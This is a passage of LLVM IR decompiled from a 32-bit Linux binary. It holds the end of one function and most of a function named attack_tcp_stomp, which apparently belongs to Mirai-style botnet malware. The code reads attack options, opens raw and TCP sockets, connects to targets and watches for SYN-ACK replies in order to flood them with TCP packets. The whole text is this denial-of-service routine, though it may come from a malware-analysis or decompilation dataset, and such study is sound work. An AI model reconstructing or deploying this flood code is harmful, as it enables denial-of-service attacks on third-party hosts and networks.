  %v2_804b142 = inttoptr i32 %v1_804b13d to i8*
  %v3_804b142 = call i32 @rand_alphastr(i8* %v2_804b142, i32 %v5_804ad12)
  store i32 %v3_804b142, i32* %eax.global-to-local, align 4
  store i32 %v5_804ad12, i32* %ecx.global-to-local, align 4
  %v1_804b14e = load i32, i32* @ebp, align 4
  %v3_804b14e = add i32 %v1_804b14e, %v1_804af45.pre-phi
  %v4_804b14e = inttoptr i32 %v3_804b14e to i8*
  store i8 0, i8* %v4_804b14e, align 1
  br label %dec_label_pc_804afbb

dec_label_pc_804b158:                             ; preds = %dec_label_pc_804afbb, %dec_label_pc_804af53.dec_label_pc_804b158_crit_edge
  store i32 0, i32* %stack_var_-124, align 4
  %v2_804b15d = call i32 @__GI_time(i32* null)
  store i32 %v2_804b15d, i32* %eax.global-to-local, align 4
  %v5_804b169 = icmp slt i32 %v2_804ad64, %v2_804b15d
  br i1 %v5_804b169, label %dec_label_pc_804b16f, label %dec_label_pc_804af53

dec_label_pc_804b16f:                             ; preds = %dec_label_pc_804b158
  store i32 %v0_804ac63, i32* %ebx.global-to-local, align 4
  ret i32 %v2_804b15d

; uselistorder directives
  uselistorder i32 %v1_804b110, { 1, 0 }
  uselistorder i32 %v1_804b0f5, { 1, 0 }
  uselistorder i32 %v7_804b0dd, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 %v5_804b05e, { 1, 0, 2 }
  uselistorder i32 %v0_804b07a, { 2, 3, 0, 1 }
  uselistorder i32 %v1_804b044, { 1, 0, 2, 3 }
  uselistorder i1 %v4_804b129, { 1, 0 }
  uselistorder i1 %v4_804af9f, { 1, 0 }
  uselistorder i1 %v13_804b0fa, { 1, 0 }
  uselistorder i1 %v13_804b0c5, { 1, 0 }
  uselistorder i32 %v1_804af45.pre-phi, { 0, 2, 1 }
  uselistorder i32 %v1_804af48.pre-phi, { 1, 0 }
  uselistorder i32 %v3_804af15, { 1, 0 }
  uselistorder i32 %v0_804ae73, { 1, 0, 2 }
  uselistorder i32 %v4_804ae90, { 1, 0 }
  uselistorder i32 %v1_804adee, { 0, 2, 1 }
  uselistorder i32 %v1_804ade6, { 1, 2, 0 }
  uselistorder i8 %v1_804adc9, { 1, 0 }
  uselistorder i32 %v4_804adb4, { 1, 2, 0 }
  uselistorder i32 %v4_804adb0, { 2, 0, 1 }
  uselistorder i32 %v3_804ad73, { 1, 0, 4, 3, 2, 6, 5, 7 }
  uselistorder i32 %v5_804ad24, { 1, 0 }
  uselistorder i32 %v5_804ad12, { 5, 7, 6, 4, 3, 2, 0, 1, 8 }
  uselistorder i32 %v5_804aced, { 0, 2, 1 }
  uselistorder i32 %v5_804acdb, { 1, 0 }
  uselistorder i32 %v5_804acc9, { 1, 0, 2 }
  uselistorder i32 %v5_804acba, { 0, 2, 1 }
  uselistorder i32 %v5_804aca5, { 0, 2, 1 }
  uselistorder i32 %v3_804ac96, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v4_804ac69, { 2, 3, 1, 4, 0 }
  uselistorder i32 %v0_804ac63, { 1, 0 }
  uselistorder i32* %stack_var_-124, { 1, 2, 3, 4, 5, 6, 7, 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %stack_var_-20, { 1, 4, 3, 2, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 16, 14, 15 }
  uselistorder i32* %edx.global-to-local, { 0, 5, 1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 6, 7, 8, 9, 14, 10, 11, 12, 13, 15, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 19, 20, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 21, 22, 23, 24, 31, 32, 33, 34, 35, 36, 37, 38, 25, 26, 27, 28, 29, 30, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i8 47, { 8, 9, 0, 1, 3, 4, 2, 5, 10, 6, 7 }
  uselistorder i32 %arg3, { 6, 0, 5, 1, 4, 7, 2, 3 }
  uselistorder i8 %arg2, { 1, 0, 2 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_804afbb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804af35, { 1, 0 }
  uselistorder label %dec_label_pc_804aefe, { 1, 0 }
  uselistorder label %dec_label_pc_804aea7, { 1, 0 }
}

define i32 @attack_tcp_stomp(i32 %arg1, i8 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-396 = alloca i32, align 4
  %stack_var_-412 = alloca i32, align 4
  %v0_804b183 = load i32, i32* @ebx, align 4
  %v4_804b18a = zext i8 %arg2 to i32
  %v5_804b18a = load i32, i32* @eax, align 4
  %v6_804b18a = and i32 %v5_804b18a, -256
  %v7_804b18a = or i32 %v6_804b18a, %v4_804b18a
  store i32 %v7_804b18a, i32* %eax.global-to-local, align 4
  store i32 %arg4, i32* @esi, align 4
  %v4_804b19a = urem i32 %arg3, 256
  %v6_804b19a = and i32 %v0_804b183, -256
  %v7_804b19a = or i32 %v6_804b19a, %v4_804b19a
  store i32 %v7_804b19a, i32* @ebx, align 4
  %v2_804b1a1 = icmp eq i8 %arg2, 0
  store i32 %v4_804b18a, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-20, align 4
  store i32 %v4_804b18a, i32* %stack_var_-412, align 4
  %v2_804b1bd = zext i8 %arg2 to i64
  %v3_804b1bd = call i32 @calloc(i64 %v2_804b1bd, i32 16)
  store i32 %v4_804b19a, i32* @ebx, align 4
  %v2_804b1cc = load i32, i32* %stack_var_-412, align 4
  store i32 %v2_804b1cc, i32* @ebp, align 4
  store i32 16, i32* %eax.global-to-local, align 4
  store i32 %v4_804b18a, i32* @edi, align 4
  store i32 %v4_804b18a, i32* %stack_var_-412, align 4
  %v3_804b1d5 = call i32 @calloc(i64 %v2_804b1bd, i32 4)
  store i32 %v3_804b1d5, i32* @eax, align 4
  %v0_804b1e2 = load i32, i32* @esi, align 4
  %v0_804b1e3 = load i32, i32* @ebx, align 4
  %v4_804b1e4 = trunc i32 %v0_804b1e3 to i8
  %v5_804b1e4 = call i32 @attack_get_opt_int(i8 %v4_804b1e4, i32 %v0_804b1e2, i32 2, i32 0)
  store i32 %v5_804b1e4, i32* @eax, align 4
  %v12_804b1ed = ptrtoint i32* %stack_var_-396 to i32
  %v0_804b1f7 = load i32, i32* @esi, align 4
  %v0_804b1f8 = load i32, i32* @ebx, align 4
  store i32 %v0_804b1f8, i32* %stack_var_-412, align 4
  %v4_804b1f9 = trunc i32 %v0_804b1f8 to i8
  %v5_804b1f9 = call i32 @attack_get_opt_int(i8 %v4_804b1f9, i32 %v0_804b1f7, i32 3, i32 65535)
  store i32 %v5_804b1f9, i32* @eax, align 4
  %sext = mul i32 %v5_804b1f9, 65536
  %v1_804b200 = sdiv i32 %sext, 65536
  store i32 %v1_804b200, i32* @edi, align 4
  %v0_804b204 = load i32, i32* @esi, align 4
  %v0_804b205 = load i32, i32* @ebx, align 4
  %v4_804b206 = trunc i32 %v0_804b205 to i8
  %v5_804b206 = call i32 @attack_get_opt_int(i8 %v4_804b206, i32 %v0_804b204, i32 4, i32 64)
  store i32 %v5_804b206, i32* @eax, align 4
  %v0_804b216 = load i32, i32* @esi, align 4
  %v0_804b217 = load i32, i32* @ebx, align 4
  store i32 %v0_804b217, i32* %stack_var_-412, align 4
  %v4_804b218 = trunc i32 %v0_804b217 to i8
  %v5_804b218 = call i32 @attack_get_opt_int(i8 %v4_804b218, i32 %v0_804b216, i32 5, i32 1)
  store i32 %v5_804b218, i32* @eax, align 4
  %v0_804b228 = load i32, i32* @esi, align 4
  %v0_804b229 = load i32, i32* @ebx, align 4
  %v4_804b22a = trunc i32 %v0_804b229 to i8
  %v5_804b22a = call i32 @attack_get_opt_int(i8 %v4_804b22a, i32 %v0_804b228, i32 7, i32 65535)
  store i32 %v5_804b22a, i32* @eax, align 4
  %v0_804b23b = load i32, i32* @esi, align 4
  %v0_804b23c = load i32, i32* @ebx, align 4
  store i32 %v0_804b23c, i32* %stack_var_-412, align 4
  %v4_804b23d = trunc i32 %v0_804b23c to i8
  %v5_804b23d = call i32 @attack_get_opt_int(i8 %v4_804b23d, i32 %v0_804b23b, i32 10, i32 0)
  store i32 %v5_804b23d, i32* @eax, align 4
  %v0_804b24a = load i32, i32* @esi, align 4
  %v0_804b24b = load i32, i32* @ebx, align 4
  %v4_804b24c = trunc i32 %v0_804b24b to i8
  %v5_804b24c = call i32 @attack_get_opt_int(i8 %v4_804b24c, i32 %v0_804b24a, i32 11, i32 1)
  store i32 %v5_804b24c, i32* @eax, align 4
  %v0_804b25c = load i32, i32* @esi, align 4
  %v0_804b25d = load i32, i32* @ebx, align 4
  store i32 %v0_804b25d, i32* %stack_var_-412, align 4
  %v4_804b25e = trunc i32 %v0_804b25d to i8
  %v5_804b25e = call i32 @attack_get_opt_int(i8 %v4_804b25e, i32 %v0_804b25c, i32 12, i32 1)
  store i32 %v5_804b25e, i32* @eax, align 4
  %v0_804b26b = load i32, i32* @esi, align 4
  %v0_804b26c = load i32, i32* @ebx, align 4
  %v4_804b26d = trunc i32 %v0_804b26c to i8
  %v5_804b26d = call i32 @attack_get_opt_int(i8 %v4_804b26d, i32 %v0_804b26b, i32 13, i32 0)
  store i32 %v5_804b26d, i32* @eax, align 4
  %v0_804b27d = load i32, i32* @esi, align 4
  %v0_804b27e = load i32, i32* @ebx, align 4
  store i32 %v0_804b27e, i32* %stack_var_-412, align 4
  %v4_804b27f = trunc i32 %v0_804b27e to i8
  %v5_804b27f = call i32 @attack_get_opt_int(i8 %v4_804b27f, i32 %v0_804b27d, i32 14, i32 0)
  store i32 %v5_804b27f, i32* @eax, align 4
  %v0_804b28c = load i32, i32* @esi, align 4
  %v0_804b28d = load i32, i32* @ebx, align 4
  %v4_804b28e = trunc i32 %v0_804b28d to i8
  %v5_804b28e = call i32 @attack_get_opt_int(i8 %v4_804b28e, i32 %v0_804b28c, i32 15, i32 0)
  store i32 %v5_804b28e, i32* @eax, align 4
  %v0_804b2a1 = load i32, i32* @esi, align 4
  %v0_804b2a2 = load i32, i32* @ebx, align 4
  store i32 %v0_804b2a2, i32* %stack_var_-412, align 4
  %v4_804b2a3 = trunc i32 %v0_804b2a2 to i8
  %v5_804b2a3 = call i32 @attack_get_opt_int(i8 %v4_804b2a3, i32 %v0_804b2a1, i32 0, i32 768)
  store i32 %v5_804b2a3, i32* @eax, align 4
  %v0_804b2b0 = load i32, i32* @esi, align 4
  %v0_804b2b1 = load i32, i32* @ebx, align 4
  %v4_804b2b2 = trunc i32 %v0_804b2b1 to i8
  %v5_804b2b2 = call i32 @attack_get_opt_int(i8 %v4_804b2b2, i32 %v0_804b2b0, i32 1, i32 1)
  store i32 %v5_804b2b2, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-412, align 4
  %v2_804b2c0 = call i32 @__GI_time(i32* null)
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v2_804b2cc = add i32 %v2_804b2c0, %arg1
  store i32 %v2_804b2cc, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-412, align 4
  %v3_804b2db = call i32 @socket(i32 2, i32 3, i32 6)
  %v1_804b2e7 = add i32 %v3_804b2db, 1
  %v8_804b2e7 = icmp eq i32 %v1_804b2e7, 0
  store i32 %v1_804b2e7, i32* %eax.global-to-local, align 4
  br i1 %v8_804b2e7, label %dec_label_pc_804b4d1, label %dec_label_pc_804b2ee

dec_label_pc_804b2ee:                             ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  store i32 4, i32* %stack_var_-412, align 4
  %v2_804b2fe = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804b2fe, i32* %eax.global-to-local, align 4
  store i32 %v3_804b2db, i32* %edx.global-to-local, align 4
  %v5_804b30f = call i32 @__GI_setsockopt(i32 %v3_804b2db, i32 0, i32 3, i32 %v2_804b2fe, i32 4)
  %v1_804b317 = add i32 %v5_804b30f, 1
  %v8_804b317 = icmp eq i32 %v1_804b317, 0
  store i32 %v1_804b317, i32* %eax.global-to-local, align 4
  br i1 %v8_804b317, label %dec_label_pc_804b4c1, label %dec_label_pc_804b31e

dec_label_pc_804b31e:                             ; preds = %dec_label_pc_804b2ee
  store i32 0, i32* %stack_var_-20, align 4
  br i1 %v2_804b1a1, label %dec_label_pc_804b6f2, label %dec_label_pc_804b339

dec_label_pc_804b339:                             ; preds = %dec_label_pc_804b31e
  %v1_804b33d = add i32 %v5_804b2a3, 40
  %v15_804b33d = trunc i32 %v1_804b33d to i16
  %v3_804b345 = call i16 @llvm.bswap.i16(i16 %v15_804b33d)
  %v4_804b345 = zext i16 %v3_804b345 to i32
  %sext1 = mul i32 %v1_804b33d, 65536
  %v6_804b345 = sdiv i32 %sext1, 65536
  %v7_804b345 = and i32 %v6_804b345, -65536
  %v8_804b345 = or i32 %v4_804b345, %v7_804b345
  store i32 %v8_804b345, i32* %ecx.global-to-local, align 4
  %v1_804b367 = sext i16 %v3_804b345 to i32
  %v2_804b3fa = inttoptr i32 %v1_804b367 to i32*
  br label %dec_label_pc_804b34e

dec_label_pc_804b34e:                             ; preds = %dec_label_pc_804b6d9, %dec_label_pc_804b49f, %dec_label_pc_804b339
  %v2_804b356 = phi i32 [ %v12_804b1ed, %dec_label_pc_804b339 ], [ %v1_804b4a8, %dec_label_pc_804b49f ], [ %v1_804b6e8, %dec_label_pc_804b6d9 ]
  %v1_804b34e = add i32 %v2_804b356, 52
  %v2_804b34e = inttoptr i32 %v1_804b34e to i32*
  %v3_804b34e = load i32, i32* %v2_804b34e, align 4
  %v1_804b352 = trunc i32 %v3_804b34e to i16
  %v2_804b352 = call i16 @llvm.bswap.i16(i16 %v1_804b352)
  %v3_804b352 = zext i16 %v2_804b352 to i32
  %v5_804b352 = and i32 %v3_804b34e, -65536
  %v6_804b352 = or i32 %v3_804b352, %v5_804b352
  store i32 %v6_804b352, i32* @esi, align 4
  %v3_804b356 = add i32 %v2_804b356, 14
  %v4_804b356 = inttoptr i32 %v3_804b356 to i16*
  store i16 %v2_804b352, i16* %v4_804b356, align 2
  %v0_804b360.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804b360.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804b360

dec_label_pc_804b360:                             ; preds = %dec_label_pc_804b4b0, %dec_label_pc_804b34e
  %v1_804b360 = phi i32 [ %v1_804b4b9, %dec_label_pc_804b4b0 ], [ %v1_804b360.pre, %dec_label_pc_804b34e ]
  %v0_804b360 = phi i32 [ %v2_804b4b4, %dec_label_pc_804b4b0 ], [ %v0_804b360.pre, %dec_label_pc_804b34e ]
  %v2_804b360 = add i32 %v1_804b360, -4
  %v3_804b360 = inttoptr i32 %v2_804b360 to i32*
  store i32 %v0_804b360, i32* %v3_804b360, align 4
  %v1_804b361 = add i32 %v1_804b360, -8
  %v2_804b361 = inttoptr i32 %v1_804b361 to i32*
  store i32 0, i32* %v2_804b361, align 4
  %v1_804b363 = add i32 %v1_804b360, -12
  %v2_804b363 = inttoptr i32 %v1_804b363 to i32*
  store i32 1, i32* %v2_804b363, align 4
  %v1_804b365 = add i32 %v1_804b360, -16
  %v2_804b365 = inttoptr i32 %v1_804b365 to i32*
  store i32 2, i32* %v2_804b365, align 4
  %v4_804b367 = call i32 @socket(i32 %v1_804b367, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804b367, i32* %eax.global-to-local, align 4
  %v0_804b36c = load i32, i32* @esp, align 4
  %v1_804b36c = add i32 %v0_804b36c, 16
  store i32 %v4_804b367, i32* @edi, align 4
  %v10_804b371 = icmp eq i32 %v4_804b367, -1
  br i1 %v10_804b371, label %dec_label_pc_804b6d9, label %dec_label_pc_804b37a

dec_label_pc_804b37a:                             ; preds = %dec_label_pc_804b360
  %v2_804b37a = add i32 %v0_804b36c, 12
  %v3_804b37a = inttoptr i32 %v2_804b37a to i32*
  store i32 %v4_804b367, i32* %v3_804b37a, align 4
  %v1_804b37b = add i32 %v0_804b36c, 8
  %v2_804b37b = inttoptr i32 %v1_804b37b to i32*
  store i32 0, i32* %v2_804b37b, align 4
  %v1_804b37d = add i32 %v0_804b36c, 4
  %v2_804b37d = inttoptr i32 %v1_804b37d to i32*
  store i32 3, i32* %v2_804b37d, align 4
  %v0_804b37f = load i32, i32* @edi, align 4
  %v3_804b37f = inttoptr i32 %v0_804b36c to i32*
  store i32 %v0_804b37f, i32* %v3_804b37f, align 4
  %v4_804b380 = call i32 @__libc_fcntl(i32 %v1_804b367, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804b385 = load i32, i32* @esp, align 4
  %v12_804b388 = or i32 %v4_804b380, 2048
  store i32 %v12_804b388, i32* %eax.global-to-local, align 4
  %v2_804b38b = add i32 %v0_804b385, 8
  %v3_804b38b = inttoptr i32 %v2_804b38b to i32*
  store i32 %v12_804b388, i32* %v3_804b38b, align 4
  %v1_804b38c = add i32 %v0_804b385, 4
  %v2_804b38c = inttoptr i32 %v1_804b38c to i32*
  store i32 4, i32* %v2_804b38c, align 4
  %v0_804b38e = load i32, i32* @edi, align 4
  %v3_804b38e = inttoptr i32 %v0_804b385 to i32*
  store i32 %v0_804b38e, i32* %v3_804b38e, align 4
  %v4_804b38f = call i32 @__libc_fcntl(i32 %v1_804b367, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804b38f, i32* %eax.global-to-local, align 4
  %v0_804b394 = load i32, i32* @esp, align 4
  %v1_804b394 = add i32 %v0_804b394, 392
  %v2_804b394 = inttoptr i32 %v1_804b394 to i32*
  %v3_804b394 = load i32, i32* %v2_804b394, align 4
  store i32 %v3_804b394, i32* %eax.global-to-local, align 4
  %v1_804b39b = add i32 %v0_804b394, 424
  %v2_804b39b = inttoptr i32 %v1_804b39b to i32*
  %v3_804b39b = load i32, i32* %v2_804b39b, align 4
  store i32 %v3_804b39b, i32* %edx.global-to-local, align 4
  %v1_804b3a2 = add i32 %v0_804b394, 372
  %v2_804b3a2 = inttoptr i32 %v1_804b3a2 to i16*
  store i16 2, i16* %v2_804b3a2, align 2
  %v0_804b3ac = load i32, i32* @esp, align 4
  %v0_804b3af = load i32, i32* %eax.global-to-local, align 4
  %v0_804b3b2 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b3b2 = mul i32 %v0_804b3af, 24
  %v3_804b3b2 = add i32 %v0_804b3b2, %v2_804b3b2
  store i32 %v3_804b3b2, i32* %eax.global-to-local, align 4
  %v1_804b3b5 = add i32 %v3_804b3b2, 20
  %v2_804b3b5 = inttoptr i32 %v1_804b3b5 to i8*
  %v3_804b3b5 = load i8, i8* %v2_804b3b5, align 1
  %tmp85 = icmp ult i8 %v3_804b3b5, 32
  %v1_804b4dc = add i32 %v3_804b3b2, 16
  %v2_804b4dc = inttoptr i32 %v1_804b4dc to i32*
  %v3_804b4dc = load i32, i32* %v2_804b4dc, align 4
  br i1 %tmp85, label %dec_label_pc_804b4dc, label %dec_label_pc_804b3bf

dec_label_pc_804b3bf:                             ; preds = %dec_label_pc_804b37a
  store i32 %v3_804b4dc, i32* %eax.global-to-local, align 4
  %v2_804b3c2 = add i32 %v0_804b3ac, 376
  %v3_804b3c2 = inttoptr i32 %v2_804b3c2 to i32*
  store i32 %v3_804b4dc, i32* %v3_804b3c2, align 4
  %v0_804b3c9 = load i32, i32* @esp, align 4
  %v1_804b3c9 = add i32 %v0_804b3c9, 52
  %v2_804b3c9 = inttoptr i32 %v1_804b3c9 to i16*
  %v3_804b3c9 = load i16, i16* %v2_804b3c9, align 2
  %v13_804b3c9 = icmp eq i16 %v3_804b3c9, -1
  br i1 %v13_804b3c9, label %dec_label_pc_804b528, label %dec_label_pc_804b3d5

dec_label_pc_804b3d5:                             ; preds = %.dec_label_pc_804b3d5_crit_edge, %dec_label_pc_804b3bf
  %v2_804b3da = phi i32 [ %v0_804b3d5.pre, %.dec_label_pc_804b3d5_crit_edge ], [ %v0_804b3c9, %dec_label_pc_804b3bf ]
  %v1_804b3d5 = add i32 %v2_804b3da, 14
  %v2_804b3d5 = inttoptr i32 %v1_804b3d5 to i16*
  %v3_804b3d5 = load i16, i16* %v2_804b3d5, align 2
  %v4_804b3d5 = zext i16 %v3_804b3d5 to i32
  %v5_804b3d5 = load i32, i32* %eax.global-to-local, align 4
  %v6_804b3d5 = and i32 %v5_804b3d5, -65536
  %v7_804b3d5 = or i32 %v6_804b3d5, %v4_804b3d5
  store i32 %v7_804b3d5, i32* %eax.global-to-local, align 4
  %v3_804b3da = add i32 %v2_804b3da, 358
  %v4_804b3da = inttoptr i32 %v3_804b3da to i16*
  store i16 %v3_804b3d5, i16* %v4_804b3da, align 2
  br label %dec_label_pc_804b3e2

dec_label_pc_804b3e2:                             ; preds = %dec_label_pc_804b528, %dec_label_pc_804b3d5
  %v0_804b3e2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b3e2 = load i32, i32* @esp, align 4
  %v2_804b3e2 = add i32 %v1_804b3e2, -4
  %v3_804b3e2 = inttoptr i32 %v2_804b3e2 to i32*
  store i32 %v0_804b3e2, i32* %v3_804b3e2, align 4
  %v1_804b3e3 = add i32 %v1_804b3e2, -8
  %v2_804b3e3 = inttoptr i32 %v1_804b3e3 to i32*
  store i32 16, i32* %v2_804b3e3, align 4
  %v1_804b3e5 = add i32 %v1_804b3e2, 356
  store i32 %v1_804b3e5, i32* %edx.global-to-local, align 4
  %v2_804b3ec = add i32 %v1_804b3e2, -12
  %v3_804b3ec = inttoptr i32 %v2_804b3ec to i32*
  store i32 %v1_804b3e5, i32* %v3_804b3ec, align 4
  %v0_804b3ed = load i32, i32* @edi, align 4
  %v2_804b3ed = add i32 %v1_804b3e2, -16
  %v3_804b3ed = inttoptr i32 %v2_804b3ed to i32*
  store i32 %v0_804b3ed, i32* %v3_804b3ed, align 4
  %v4_804b3ee = call i32 @__libc_connect(i32 %v1_804b367, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804b3ee, i32* %eax.global-to-local, align 4
  %v0_804b3f3 = load i32, i32* @esp, align 4
  %v1_804b3f3 = inttoptr i32 %v0_804b3f3 to i32*
  store i32 0, i32* %v1_804b3f3, align 4
  %v3_804b3fa = call i32 @__GI_time(i32* %v2_804b3fa)
  store i32 %v3_804b3fa, i32* @eax, align 4
  %v0_804b3ff = load i32, i32* @esp, align 4
  store i32 %v3_804b3fa, i32* @ebx, align 4
  %v1_804b404 = add i32 %v0_804b3ff, 100
  store i32 %v1_804b404, i32* @ebp, align 4
  br label %dec_label_pc_804b428

dec_label_pc_804b410:                             ; preds = %dec_label_pc_804b496, %dec_label_pc_804b477, %dec_label_pc_804b472, %dec_label_pc_804b462
  %v1_804b413 = add i32 %v0_804b45a, 16
  %v2_804b413 = inttoptr i32 %v1_804b413 to i32*
  store i32 0, i32* %v2_804b413, align 4
  %v3_804b415 = call i32 @__GI_time(i32* %v2_804b3fa)
  %v1_804b41a = load i32, i32* @ebx, align 4
  %v2_804b41a = sub i32 %v3_804b415, %v1_804b41a
  store i32 %v2_804b41a, i32* @eax, align 4
  %v0_804b41c = load i32, i32* @esp, align 4
  %v1_804b41f = add i32 %v2_804b41a, -10
  %v6_804b41f = sub i32 9, %v2_804b41a
  %v7_804b41f = and i32 %v6_804b41f, %v2_804b41a
  %v8_804b41f = icmp slt i32 %v7_804b41f, 0
  %v9_804b41f = icmp eq i32 %v1_804b41f, 0
  %v10_804b41f = icmp slt i32 %v1_804b41f, 0
  %v3_804b422 = icmp eq i1 %v10_804b41f, %v8_804b41f
  %v4_804b422 = icmp eq i1 %v9_804b41f, false
  %v5_804b422 = and i1 %v4_804b422, %v3_804b422
  br i1 %v5_804b422, label %dec_label_pc_804b4b0, label %dec_label_pc_804b428

dec_label_pc_804b428:                             ; preds = %dec_label_pc_804b410, %dec_label_pc_804b3e2
  %v0_804b428.in = phi i32 [ %v0_804b41c, %dec_label_pc_804b410 ], [ %v0_804b3ff, %dec_label_pc_804b3e2 ]
  %v1_804b428 = add i32 %v0_804b428.in, 388
  %v2_804b428 = inttoptr i32 %v1_804b428 to i32*
  store i32 16, i32* %v2_804b428, align 4
  %v0_804b433 = load i32, i32* @eax, align 4
  %v1_804b433 = load i32, i32* @esp, align 4
  %v2_804b433 = add i32 %v1_804b433, -4
  %v3_804b433 = inttoptr i32 %v2_804b433 to i32*
  store i32 %v0_804b433, i32* %v3_804b433, align 4
  %v0_804b434 = load i32, i32* @eax, align 4
  %v2_804b434 = add i32 %v1_804b433, -8
  %v3_804b434 = inttoptr i32 %v2_804b434 to i32*
  store i32 %v0_804b434, i32* %v3_804b434, align 4
  %v1_804b435 = add i32 %v1_804b433, 372
  store i32 %v1_804b435, i32* %ecx.global-to-local, align 4
  %v2_804b43c = add i32 %v1_804b433, -12
  %v3_804b43c = inttoptr i32 %v2_804b43c to i32*
  store i32 %v1_804b435, i32* %v3_804b43c, align 4
  %v1_804b43d = add i32 %v1_804b433, 340
  store i32 %v1_804b43d, i32* @esi, align 4
  %v2_804b444 = add i32 %v1_804b433, -16
  %v3_804b444 = inttoptr i32 %v2_804b444 to i32*
  store i32 %v1_804b43d, i32* %v3_804b444, align 4
  %v1_804b445 = add i32 %v1_804b433, -20
  %v2_804b445 = inttoptr i32 %v1_804b445 to i32*
  store i32 16384, i32* %v2_804b445, align 4
  %v1_804b44a = add i32 %v1_804b433, -24
  %v2_804b44a = inttoptr i32 %v1_804b44a to i32*
  store i32 256, i32* %v2_804b44a, align 4
  %v0_804b44f = load i32, i32* @ebp, align 4
  %v2_804b44f = add i32 %v1_804b433, -28
  %v3_804b44f = inttoptr i32 %v2_804b44f to i32*
  store i32 %v0_804b44f, i32* %v3_804b44f, align 4
  %v1_804b450 = add i32 %v1_804b433, 40
  %v2_804b450 = inttoptr i32 %v1_804b450 to i32*
  %v3_804b450 = load i32, i32* %v2_804b450, align 4
  store i32 %v3_804b450, i32* %eax.global-to-local, align 4
  %v2_804b454 = add i32 %v1_804b433, -32
  %v3_804b454 = inttoptr i32 %v2_804b454 to i32*
  store i32 %v3_804b450, i32* %v3_804b454, align 4
  %v0_804b455 = call i32 @__libc_recvfrom()
  store i32 %v0_804b455, i32* %eax.global-to-local, align 4
  %v0_804b45a = load i32, i32* @esp, align 4
  %v1_804b45a = add i32 %v0_804b45a, 32
  %v10_804b45d = icmp eq i32 %v0_804b455, -1
  br i1 %v10_804b45d, label %dec_label_pc_804b4d1, label %dec_label_pc_804b462

dec_label_pc_804b462:                             ; preds = %dec_label_pc_804b428
  %v1_804b462 = add i32 %v0_804b45a, 392
  %v2_804b462 = inttoptr i32 %v1_804b462 to i32*
  %v3_804b462 = load i32, i32* %v2_804b462, align 4
  store i32 %v3_804b462, i32* %ecx.global-to-local, align 4
  %v1_804b469 = add i32 %v0_804b45a, 376
  %v2_804b469 = inttoptr i32 %v1_804b469 to i32*
  %v3_804b469 = load i32, i32* %v2_804b469, align 4
  %v15_804b469 = icmp eq i32 %v3_804b469, %v3_804b462
  %v1_804b470 = icmp eq i1 %v15_804b469, false
  br i1 %v1_804b470, label %dec_label_pc_804b410, label %dec_label_pc_804b472

dec_label_pc_804b472:                             ; preds = %dec_label_pc_804b462
  %tmp86 = icmp ult i32 %v0_804b455, 41
  br i1 %tmp86, label %dec_label_pc_804b410, label %dec_label_pc_804b477

dec_label_pc_804b477:                             ; preds = %dec_label_pc_804b472
  %v1_804b477 = add i32 %v0_804b45a, 136
  %v2_804b477 = inttoptr i32 %v1_804b477 to i32*
  %v3_804b477 = load i32, i32* %v2_804b477, align 4
  store i32 %v3_804b477, i32* @esi, align 4
  %v1_804b47b = trunc i32 %v3_804b477 to i16
  %v3_804b47b = add i32 %v0_804b45a, 390
  %v4_804b47b = inttoptr i32 %v3_804b47b to i16*
  %v5_804b47b = load i16, i16* %v4_804b47b, align 2
  %v16_804b47b = icmp eq i16 %v1_804b47b, %v5_804b47b
  %v1_804b483 = icmp eq i1 %v16_804b47b, false
  br i1 %v1_804b483, label %dec_label_pc_804b410, label %dec_label_pc_804b485

dec_label_pc_804b485:                             ; preds = %dec_label_pc_804b477
  %v1_804b485 = add i32 %v0_804b45a, 149
  %v2_804b485 = inttoptr i32 %v1_804b485 to i8*
  %v3_804b485 = load i8, i8* %v2_804b485, align 1
  %v4_804b485 = zext i8 %v3_804b485 to i32
  %v5_804b485 = load i32, i32* @edx, align 4
  %v6_804b485 = and i32 %v5_804b485, -256
  %v7_804b485 = or i32 %v6_804b485, %v4_804b485
  store i32 %v7_804b485, i32* %edx.global-to-local, align 4
  %v1_804b48b = and i32 %v4_804b485, 18
  store i32 %v1_804b48b, i32* @eax, align 4
  %v10_804b48e = icmp eq i32 %v1_804b48b, 18
  br i1 %v10_804b48e, label %dec_label_pc_804b53a, label %dec_label_pc_804b496

dec_label_pc_804b496:                             ; preds = %dec_label_pc_804b485
  %v1_804b496 = and i32 %v4_804b485, 5
  %v2_804b496 = icmp eq i32 %v1_804b496, 0
  store i32 %v1_804b496, i32* %edx.global-to-local, align 4
  br i1 %v2_804b496, label %dec_label_pc_804b410, label %dec_label_pc_804b49f

dec_label_pc_804b49f:                             ; preds = %dec_label_pc_804b496
